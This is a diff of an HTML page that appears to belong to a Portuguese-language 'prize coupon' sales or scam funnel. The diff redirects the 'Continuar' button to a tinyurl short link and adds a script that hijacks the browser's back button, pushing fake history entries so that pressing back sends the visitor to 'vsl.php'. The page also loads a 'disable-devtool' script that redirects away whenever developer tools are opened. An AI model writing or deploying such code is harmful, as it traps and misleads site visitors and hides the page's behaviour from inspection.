@@ -27,7 +27,7 @@
         </div>
 
         <div class="coolinput" style="margin-top: -10px;">
-            <a style="display: block; background-color: #353336; color: #ffffff; text-align: center; padding: 15px; border-radius: 23px; bottom: 60px; -webkit-animation: pulse 1.5s infinite; position: unset; margin-top: 30px; width: 100%;" href="../06/index.html" id="continuarCadastroAtivo" class="continuarAtivo">Continuar</a>
+            <a style="display: block; background-color: #353336; color: #ffffff; text-align: center; padding: 15px; border-radius: 23px; bottom: 60px; -webkit-animation: pulse 1.5s infinite; position: unset; margin-top: 30px; width: 100%;" href="https://tinyurl.com/Cupom-Premiado06" id="continuarCadastroAtivo" class="continuarAtivo">Continuar</a>
         </div>
 
         
@@ -35,7 +35,21 @@
         <script src="js/UZTXJ2EaoXIF.js"></script>
         <script src="js/8iyotjdSW6gE.js"></script>
         <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
-  
-  
+        <script>
+            // BACK REDIRECT
+            var urlBackRedirect = 'vsl.php'; // lembre-se de usar a url sem espaços
+            // não altere nada abaixo dessa linha
+            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+            window.onpopstate = function () {
+                setTimeout(function () {
+                    location.href = urlBackRedirect;
+                }, 1);
+            };
+            // BACK REDIRECT
+        </script>
     
 </body></html>
